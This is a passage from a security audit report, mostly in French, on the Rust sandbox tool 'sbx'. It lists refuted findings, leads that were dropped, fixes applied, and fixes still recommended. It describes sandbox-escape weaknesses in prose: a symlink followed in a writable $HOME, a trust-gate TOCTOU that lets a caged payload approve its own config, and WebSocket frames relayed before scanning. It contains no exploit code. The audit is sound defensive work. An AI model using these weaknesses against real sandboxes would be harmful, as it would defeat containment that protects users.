- **`src/config/overrides.rs:472`** — `SBX_ENV_<KEY>` changes a launch's in-cage code-load posture with no environment-source notice
  <br/>*Réfuté :* … The postulated attacker is someone who can edit the user's shell profile, who could replace the `sbx` invocation outright, so no boundary is crossed. The value is also not invisible: apply_env records Provenance::Override in env_layer (mod.rs:956), which `sbx config` surfaces (view.rs:1036).

- **`src/sandbox/attach.rs:266`** — descendants() has no visited set, so a cyclic parent map hangs `sbx session attach` and allocates without bound
  <br/>*Réfuté :* 

- **`src/sandbox/cgroup.rs:545`** — A partially delegated controller set silently drops TasksMax and still reports a verified green limit
  <br/>*Réfuté :* 

- **`src/sandbox/fs_watch.rs:237`** — Cage-driven inotify watch installation has no per-session cap and drains the host user's global watch budget
  <br/>*Réfuté :* … that a watch-descriptor exhaustion or kernel queue overflow "is surfaced with a one-time warning rather than hidden", and that the feed "is not a boundary — the cage is — only an observation gap"; the ENOSPC arm (239-242) warns once with the exact remedy ("raise fs.inotify.max_user_watches") and keeps the watches already installed. Nothing in the fs lens gates a security decision, so evading it costs coverage, not containment.

- **`src/sandbox/observe_feed.rs:173`** — `seen` is never pruned, so pid reuse permanently silences the exec feed and the set grows for the session's life
  <br/>*Réfuté :* … The companion claim that the set grows "to millions of entries" at pid_max=4194304 fails for the same reason — the set is bounded by processes actually observed at a tick, not by pids consumed. What remains is a rare, bounded false negative in a lens the module documents as best-effort and explicitly not a security boundary (lines 20-22, 228-230); no memory issue and no silencing of the feed.

- **`src/sandbox/prebuilt.rs:254`** — `pins` validates the hash column but not the URL column, though the URL is the one interpolated into the generated nix expression
  <br/>*Réfuté :* … hat leaves only a same-uid local process, which can already run anything the user can, so it crosses no boundary — and the auditor's own alternative is an explicitly hypothetical 'future change that binds <data>/projects/<id>'. is_sri on the hash column is a corruption self-heal (documented at prebuilt.rs:241-242 and pinned by tarball.rs:491-499), not a trust check, so the asymmetry does not carry the security meaning claimed.

- **`src/sandbox/proxy/ca.rs:133`** — The TLS leaf cache never evicts, so a cage can disable it for the session
  <br/>*Réfuté :* … The parallel egress_stats claim is likewise documented rather than defective: the file is src/sandbox/egress_stats.rs (not the cited path/line), and Tally::bump's doc at lines 129-148 states that hosts past MAX_HOSTS fold into `overflow` with their counts kept and their identity deliberately forgotten, 'since remembering is what the cap exists to stop'.

- **`src/sandbox/proxy/h2mitm.rs:998`** — The upstream HTTP/2 client handshake is the one step in `open_upstream` with no timeout
  <br/>*Réfuté :* … So "every stream parks forever inside `open_upstream`", "never leaves `inflight`", and "`refuse_upstream` is never reached" are all false. The code-shape observation that lines 998-1002 carry no `tokio::time::timeout` (unlike 975 and 986) is true but has no failure behind it.

- **`src/sandbox/proxy/h2mitm.rs:211`** — Extended-CONNECT refusal is logged but not counted, unlike its HTTP/1.1 twin
  <br/>*Réfuté :* … The nearest h1 analogue on the policy side, a WebSocket upgrade a rule does not admit (allowlist/mod.rs:242), goes through `decide_https` and lands in the `denied` bucket via `PolicyRefusal::DeniedMethod` — not the `blocked` bucket the finding says an operator would see move.

- **`src/sandbox/proxy/websocket.rs:313`** — The window-resync inflate budget is per message, so a tunnel can repeat it without limit
  <br/>*Réfuté :* … And it grants the cage no capability it lacks: cgroup.rs::profile (163-175) applies only MemoryHigh/MemoryMax/TasksMax — there is no CPU quota on the cage — so a cage that wants to burn host CPU as the user's own uid does it directly, without a WebSocket. No new capability, bound documented at the site, amplification claim not achievable.

- **`src/sandbox/proxy/wire.rs:505`** — `response_framing` decides "bodiless" from a case-insensitive HEAD match, but the method is forwarded verbatim and HTTP methods are case-sensitive
  <br/>*Réfuté :* … thing is parked; even were it persistent, pool::park probes with `is_quiet` — a non-blocking read *through the TLS session* (pool.rs:196-206, and park at pool.rs:131-136) — and checkout re-probes with `still_live` (pool.rs:108-118, 179-191), so a connection holding the 157 unread bytes is dropped at either end. Finally the only party harmed is the cage that chose to send a non-canonical method token; no sbx control is crossed.

- **`src/sandbox/sshagent.rs:162`** — `Filter::admits` matches by comment, which is not unique — one `allow` entry can grant several keys
  <br/>*Réfuté :* … s also surfaced, not silent: admission() (793-806) collects every admitted key's label and launch.rs:4589-4602 prints "ssh-agent: the cage may sign with gigi@laptop, gigi@laptop (N other keys withheld)" on every launch, the no-match warning (4553-4557) points the user at `ssh-add -l` for the fingerprint spelling, and [ssh_agent] confirm prompts per signature with that label. At most a documentation/UX sharp edge, not a defect.


---

## Pistes examinées et écartées

Distinctes des 17 findings réfutés, qui ont leur propre section : celles-ci n'ont jamais été portées au rang de finding.

Nommées parce qu'une piste écartée pour une bonne raison vaut mieux qu'un finding de plus, et parce que cela borne ce que ce rapport couvre.

- **`0.0.0.0/8` dans le classificateur SSRF.** `classify_v4` ne range que le `0.0.0.0` exact en `Blocked` ; `0.0.0.1` tombe en `Public`. Mesuré sur cette machine : `connect()` vers `0.0.0.0` atteint bien `127.0.0.1`, mais `0.0.0.1` et `0.1` expirent — la route n'existe pas. Pas de chemin de panne, donc pas de finding. (La forme compatible-IPv4 en v6, elle, est retenue, avec sa limite énoncée.)
- **Le compteur de connexions en clair de la boucle du proxy.** Ressemble au motif que `ConnCap` a été écrit pour corriger, mais la boucle d'acceptation est à fil unique et l'en-tête de `conncap.rs` dit explicitement que le proxy et le plan de contrôle portent cette défense en ligne, délibérément. Pas un défaut.
- **`redact_named` en O(aiguilles × tampon).** Réel, mais le tampon est plafonné à `max_output` (64 KiB par défaut) plus la marge de scan : le coût ne peut pas devenir intéressant. Écarté comme micro-optimisation sans entrée derrière elle.
- **`BasicConstraints::Unconstrained` sur la CA éphémère du proxy.** Contraindre la longueur de chaîne serait plus serré, mais la CA est éphémère, par session, et n'est de confiance que dans la cage : durcissement spéculatif sans chemin de panne.
- **`clippy -W pedantic -W nursery`.** Exécuté sur tout l'arbre : 2793 avertissements, dont l'écrasante majorité sont des `pub(crate)` dans un module privé et des `clone` redondants sur des chemins d'initialisation uniques. Trié par pertinence, il ne reste presque rien : les `Drop` significatifs « early-droppable » sont des verrous relâchés en fin de portée sans IO entre les deux, les `HashMap<_, ()>` sont des captures `#[serde(flatten)]` qui doivent être des maps, et les soustractions de `Duration` non vérifiées sont dans du code de test. Le seul reste utile est déjà dans la section duplication.
- **La validation des noms d'app.** Mesurée, solide (voir la section « sans finding »).
- **Le trailing dot dans un hôte d'allowlist.** `canonical_host` retire tous les points finaux et la doc explique pourquoi ; les treize appelants ont été listés et aucun ne compare un hôte sans passer par lui. Une seule divergence subsiste, sur le garde-fou d'IP littérale au CONNECT, et elle est traitée en LOW.

---

## Ce qui a été corrigé, et ce qui ne l'a pas été

Les 91 findings retenus ont été traités. Le travail a été découpé en lots à fichiers disjoints, chaque lot corrigé puis passé au crible de `mise run ci` (fmt + clippy + rustdoc + suite complète) avant d'être poussé. Chaque correctif de comportement porte un test de régression, et pour l'essentiel d'entre eux le test a été vérifié en annulant temporairement le correctif : sans lui, il échoue.

**86 findings ont reçu un correctif de code.** Les quatre HIGH du périmètre cage/proxy en font partie : le `DirBuilder` récursif qui suivait un lien symbolique planté dans le `$HOME` inscriptible avant de livrer ce chemin à bwrap comme source de montage lecture-écriture ; le `[fs] deny` qui s'évaporait quand un chemin masqué devenait impossible à `stat` ; le chemin d'attache à stdio hérité qui ne quittait pas la session de `sbx` ; et les trames que la cage pipeline derrière sa poignée de main WebSocket, écrites dans le tampon TLS amont *avant* le passage du fil-piège, si bien que le blocage était signalé et n'avait pas lieu.

**Cinq findings n'ont reçu que de la prose, et il faut distinguer deux cas.** Pour trois d'entre eux la prose *était* le défaut, donc la corriger est le correctif complet : `plugins/stores.rs:49`, `cli/proc.rs:405`, et le plus net, `seccomp.rs:1287`, dont le commentaire annonçait `EFAULT` pour la sonde `clone3` à structure vide alors que le noyau refuse la taille avant de déréférencer le pointeur — c'est `EINVAL`, exactement ce que le test affirmait déjà.

Les **deux** derniers sont des lacunes réelles laissées ouvertes, documentées là où elles vivent. Le tableau ci-dessous les donne, avec trois autres findings dont le correctif proposé a été écarté au profit d'un autre — ceux-là ont bien reçu du code, mais pas celui que le finding demandait, et la raison compte autant que le correctif :

| Finding | Pourquoi pas de code |
|---|---|
| `src/sandbox/observe_feed.rs:179` — le filtre du flux d'exec s'appuie sur `comm`, que tout processus réécrit | Le fermer demande une identité que possède le *lancement*, pas le processus observé. Cette machine ne peut pas exécuter de cage (ni bwrap ni userns porteur de capacités), donc le correctif serait invérifiable dans un chemin adjacent à l'application de politique. La lacune est décrite là où vit le filtre. |
| `src/sandbox/gc.rs:103` — `nix-tools/` n'est jamais réconcilié, donc l'out-link d'un outil `nix:` retiré retient sa closure | Chemin destructeur. L'ensemble courant que la fonction reçoit ne contient rien pour un outil équipé par mise : réconcilier contre lui supprimerait **tous** les roots d'outils `nix:` vivants au premier `sbx gc --prune`, ce qui est strictement pire que la fuite. Le vrai correctif exige de rejouer exactement le nommage des out-links, et le mode d'échec d'un décalage est la suppression, pas la rétention. |
| `src/cli/proc.rs:405` — le commentaire prétendait que `sbx proc pending` refuse un projet irrésolu | Le commentaire est corrigé ; la portée projet ne l'est pas. Ce serait une surface CLI nouvelle (`-a`/`--all`, une ligne de page d'aide, la complétion, les gardes de documentation), ni minimale ni locale. |
| `src/store.rs:323` — le chemin de socket d'un broker peut dépasser la réserve de `DATA_DIR_MAX` | Rétrécir le plafond refuserait de démarrer une installation existante dont le répertoire de données tombe entre l'ancien et le nouveau — un verrouillage total, pire que le `ENAMETOOLONG` évité. **Corrigé autrement** : le seul chemin de socket dont la largeur est choisie par la configuration est mesuré contre l'installation réelle au moment du `bind`, et refusé en nommant le broker fautif. |
| `src/config/secrets.rs:81` (b) — deux déclarations dont les cibles se *recouvrent* sans être égales | **Corrigé autrement, et c'est un choix.** Absorber la plus large parce qu'une plus étroite est déclarée ensuite retirerait le credential de tous les autres chemins de cet hôte : un changement silencieux de qui est authentifié, que la configuration ne demande pas. Le recouvrement est donc *signalé*, jamais résolu — comme un recouvrement de règles L4/L7 sur un même hôte l'est déjà dans ce dépôt. `Rule::overlaps` répond `true` seulement quand le recouvrement est certain ; un `re:` ou un `*.` non identique répond `false` plutôt que de deviner. |

**Cinq findings franchissaient les frontières de lots** — le fichier à corriger n'appartenait pas au lot qui portait le finding — et ont été terminés ensuite, une fois l'arbre entier disponible :

- **Le TOCTOU du portail de confiance** (`cli/config.rs:3058`, `cli/net.rs:3507`, `cli/proc.rs:231`). `sbx config set`, `sbx net allow --local` et `sbx proc` écrivaient la configuration puis la ré-attestaient par `trust::trust()`, qui **relit le fichier**. L'arbre du projet est monté en lecture-écriture dans la cage : une charge utile écrivant entre les deux faisait bénir sa propre configuration. `trust_written` existait déjà pour cela et `write_doc` composait déjà le texte — il était jeté sur ces chemins. `Written<T>` est devenu générique, les six verbes d'édition rendent le texte qu'ils ont écrit, et un no-op rend le document tel qu'il a été lu.
- **Le `connect(2)` non borné** (`proxy/mod.rs:761`) nommait trois chemins ; un seul était atteignable depuis le lot qui le portait. Les deux autres — le clair et le splice brut — composaient les mêmes lignes que la marche multi-adresses, et les deux ont été faits ensemble.
- **`is_valid_deb_url`** comparait l'extension telle quelle pendant que `select_release_asset` la minusculait, transformant le désaccord en refus dur de toute une release.
- **Le verrou d'app par nom seul** (`store.rs:1174`) : deux projets déclarant une app `home_scope = "project"` de même nom partageaient un verrou, et rouler l'un déplaçait l'autre. La chaîne de graines devient ordonnée pour que l'app déjà épinglée hérite de sa propre révision plutôt que de repartir du canal global.
- **`Rule::overlaps`**, ci-dessus.

Le test qui manquait au HIGH WebSocket a été écrit à la main : `relay_websocket` n'est atteignable que de bout en bout, donc le test appartient à la suite e2e du proxy, un fichier hors du lot de l'agent. Il pipeline la trame derrière la poignée de main et affirme les deux postures ; annuler l'ordre du correctif le fait échouer.

## Ce qu'il faudrait corriger en premier


Par ordre de rapport entre le risque fermé et le coût du correctif. Les six premiers tiennent chacun en quelques lignes, parce que dans chaque cas le code correct est déjà dans l'arbre.

1. **`binds.rs:1589`** → `cagedir::ensure_under`. Une boucle ; le garde-fou existe et est appelé huit lignes plus bas.
2. **`config/mod.rs:132`** → ajouter le préfixe `BASH_FUNC_` et les noms de chargement de code des interpréteurs. `config/tasks.rs:960-995` en refuse déjà la moitié pour une tâche : c'est la même liste, à recopier.
3. **`allowlist/mod.rs:1516`** → `matches_deny` au lieu de `matches` dans le bras deny de `explain_clear`. Un mot.
4. **`cli/config.rs:3058` et `cli/net.rs:3507`** → `trust::trust_written` au lieu de `trust::trust`, comme `main.rs:835` et `:898`.
5. **`trust.rs:211`** → indexer le marqueur sur le répertoire de projet, ou refuser un `.sbx.toml` symlink avec `O_NOFOLLOW`. L'idiome est déjà dans `manage.rs:1417`.
6. **`store.rs:404`** → exiger `$HOME` absolu, comme `trust.rs:169` le fait sur la même variable.
7. **`fsmask.rs:311`** → distinguer « absent » de « illisible », et faire d'une entrée `deny` irrésoluble un refus de lancement.
8. **`attach.rs:360`** → `setsid()` dans le bras `TtyMode::Inherit`, pour aligner ce chemin sur le `--new-session` que tous les autres émettent.
9. **`websocket.rs:1060` et `:596`** → scanner avant de relayer les trames en attente derrière la poignée de main, et refuser une trame de contrôle qui déclare plus de 125 octets.
10. **`config/fspolicy.rs:108`** → faire participer le plafond intégré au pli, et corriger le cas `from_extra` du test qui épingle aujourd'hui le défaut.

Plusieurs de ces correctifs changent aussi une phrase de la documentation, et cela en fait partie : `fs.md` affirme deux propriétés que le code ne tient pas, `apps.md:150-152` énonce une règle plus stricte que la porte réelle, `attest_index` (`deb.rs:326`) décrit une chaîne de signature qui va plus loin que ce que le code vérifie, et `security-model.md` range « app definitions » parmi les champs qu'un projet non approuvé ne peut pas toucher.

## Ce que ce rapport ne couvre pas

- Les tests en cage (`mise run test-cage`) n'ont pas pu s'exécuter ici : la machine n'a ni userns porteur de capacités, ni nix, ni session systemd. 78 sauts ont été enregistrés pour cette raison, chacun nommé. Ce qui dépend d'un vrai lancement de cage — le comportement effectif de bwrap sous les montages décrits, le filtre seccomp appliqué à un vrai processus, les limites cgroup — a été audité par lecture et non par exécution.
- `src/sandbox/egress.rs`, `egress_stats.rs`, `netlearn.rs` et le plan des tâches n'ont eu aucun auditeur.
- Le rapport ne dit rien de la qualité des dépendances tierces au-delà de la manière dont sbx s'en sert.
- Les 8 findings marqués **PLAUSIBLE** n'ont pas été établis de bout en bout, et le rapport le dit à chaque fois plutôt que de les ranger avec les autres.
- Un réfuteur reste un lecteur : il peut se tromper dans les deux sens. Là où j'ai vérifié moi-même un finding qu'un réfuteur avait aussi examiné, nos verdicts ont concordé — y compris quand le réfuteur avait raison contre moi, ce qui est arrivé trois fois et est signalé à chaque fois dans le texte.
